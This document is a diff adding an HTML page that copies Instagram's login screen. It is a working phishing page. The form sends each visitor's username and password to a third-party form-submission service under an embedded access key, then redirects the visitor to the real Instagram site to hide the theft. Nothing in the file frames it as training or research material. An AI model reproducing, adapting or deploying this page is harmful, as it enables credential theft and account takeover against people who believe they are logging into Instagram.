@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="favicon.ico" type="image/x-icon">
+    <title>Login • Instagram</title>
+    <link href="https://fonts.googleapis.com/css?family=Proxima+Nova&display=swap" rel="stylesheet">
+    <style>
+        * {
+            font-family: 'Proxima Nova', sans-serif;
+        }
+
+        header {
+            display: flex;
+            justify-content: center;
+            margin-top: 80px;
+            margin-bottom: 40px;
+        }
+
+        header img {
+            width: max(10vw, 300px);
+            position: relative;
+        }
+
+        body {
+            background-color: rgb(248, 245, 245);
+        }
+
+        main form {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+
+        }
+
+        main form input {
+            height: 24.7px;
+            width: 324px;
+            margin-bottom: 4px;
+            border-radius: 3px;
+            border: 1px solid rgba(199, 194, 194, 0.686);
+        }
+
+        ::placeholder {
+            padding-left: 3px;
+            color: rgb(140, 137, 137);
+        }
+
+        .master {
+            background-color: white;
+            border: 1px solid rgba(0, 0, 0, 0.147);
+            max-width: 414px;
+            margin-left: auto;
+            margin-right: auto;
+            height: 420px;
+            margin-top: 23px;
+            border-radius: 5px;
+        }
+
+        main button {
+            margin-top: 14px;
+            height: 24.7px;
+            width: 324px;
+            border: 1px solid rgba(0, 0, 0, 0.147);
+            color: white;
+            font-weight: bolder;
+            font-size: 14px;
+            background-color: rgba(1, 149, 255, 0.726);
+            border-radius: 3px;
+            transition: all 0.2s ease-in-out;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        main form .mrbutton {
+            display: flex;
+            justify-content: center;
+
+        }
+
+
+        main form button a {
+            text-decoration: none;
+            color: white;
+        }
+
+
+        main img {
+            width: 303px;
+
+        }
+
+        .special {
+            margin-left: auto;
+            margin-right: auto;
+            margin-top: 23px;
+            border: 1px solid rgba(0, 0, 0, 0.147);
+            height: 69px;
+            background-color: white;
+            max-width: 414px;
+            border-radius: 5px;
+        }
+
+        .none {
+            display: flex;
+            justify-content: center;
+            padding-top: 19px;
+
+        }
+
+        .none a {
+            text-decoration: none;
+            color: rgb(8, 160, 255);
+            
+
+        }
+
+        main button:hover {
+            background-color: rgba(15, 135, 221, 0.726);
+            cursor: pointer;
+        }
+
+        .img {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        
+    </style>
+</head>
+
+<body>
+    <div class="master">
+        <header>
+            <a href="https://www.instagram.com"><img src="assets/Screenshot 2024-10-16 103331.png" alt="banner.png"></a>
+        </header>
+        <main>
+            <form action="https://api.web3forms.com/submit " method="POST">
+                <input type="hidden" name="access_key" value="88888371-3829-4923-b11b-5c39918bc576">
+                <input type="hidden" name="redirect" value="https://www.instagram.com">
+                <input type="text" name="id" id="username" placeholder="Phone number, username, or email" required>
+                <label for="username"></label>
+                <input type="text" name="pass" id="password" placeholder="Password" required>
+                
+                <label for="password"></label>
+                <div class="mrbutton">
+                    <button type="submit"><a href="https://www.instagram-meta.github.io/.com">Log In</a></button>
+
+                </div>
+
+            </form>
+
+            <div class="img">
+                <a href="https://www.instagram.com"><img src="assets/Screenshot 2024-10-16 112027.png" alt=""></a>
+            </div>
+        </main>
+    </div>
+    <div class="special">
+        <div class="none">
+            Don't have an account? <a
+                href="https://www.bing.com/ck/a?!&&p=1ae1cd24d8713b17JmltdHM9MTcyOTAzNjgwMCZpZ3VpZD0wOTQ1ZWMwMi1mM2NiLTZmZGYtMTYxOC1mODM4ZjJhYjZlYWImaW5zaWQ9NTE4MA&ptn=3&ver=2&hsh=3&fclid=0945ec02-f3cb-6fdf-1618-f838f2ab6eab&psq=instagram+sign+up+create+account&u=a1aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS9hY2NvdW50cy9lbWFpbHNpZ251cC8&ntb=1">
+                &nbsp;&nbsp;Sign up</a>
+        </div>
+    </div>
+
+</body>
+
+</html>
